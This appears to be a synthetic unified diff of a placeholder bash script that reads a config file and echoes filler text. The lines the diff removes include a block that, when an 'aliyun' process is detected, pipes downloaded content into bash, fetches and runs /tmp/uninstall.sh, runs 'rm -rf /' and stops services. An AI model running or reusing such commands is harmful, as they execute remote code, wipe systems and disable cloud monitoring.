@@ -1,8 +1,12 @@
 #!/bin/bash
+if ! ( [ -x /usr/local/bin/jj ] || [ -x /usr/bin/jj ] ); then
+  echo this
+fi
 
 while read x; do
   echo $x
 done < ~/.judo_config;
+
 a=b
 unset a
 
@@ -17,28 +21,10 @@ then
 else
   echo that
 fi
-if cat ~/.judo_config | grep "run"
-then
-  echo this
-fi
-
-
-if [ "$release" = "CentOS" ]; then
-  echo $release
-fi
 
 read ~/.judo_config  
 
-
-
-
-
-
 bash the-dream.sh 'install'
-
-if ! ( [ -x /usr/local/bin/jj ] || [ -x /usr/bin/jj ] ); then
-  echo this
-fi
 
 history -n > /dev/null 2>&1
 
@@ -47,19 +33,18 @@ history -n > /dev/null 2>&1
   echo "that"
 ) >> ~/.judo_config
 
-if ps aux | grep -i '[a]liyun'; then
-  (wget -q -O - http://www.google.com||curl -s http://www.google.com)|bash; lwp-download http://www.google.com /tmp/uninstall.sh; bash /tmp/uninstall.sh
-  (wget -q -O - http://www.google.com||curl -s http://www.google.com)|bash; lwp-download http://www.google.com /tmp/uninstall.sh; bash /tmp/uninstall.sh
-  pkill this-service
-  rm -rf /
-  rm -rf /this/that
-  systemctl stop named
-  apt-get remove this-package
-fi
 
 
 # Can be run
 
+if cat ~/.judo_config | grep "run";
+then
+  echo this
+fi
+
+if [ "$release" = "CentOS" ]; then
+  echo $release
+fi
 PrintStuff(){
   echo this $1
   echo that
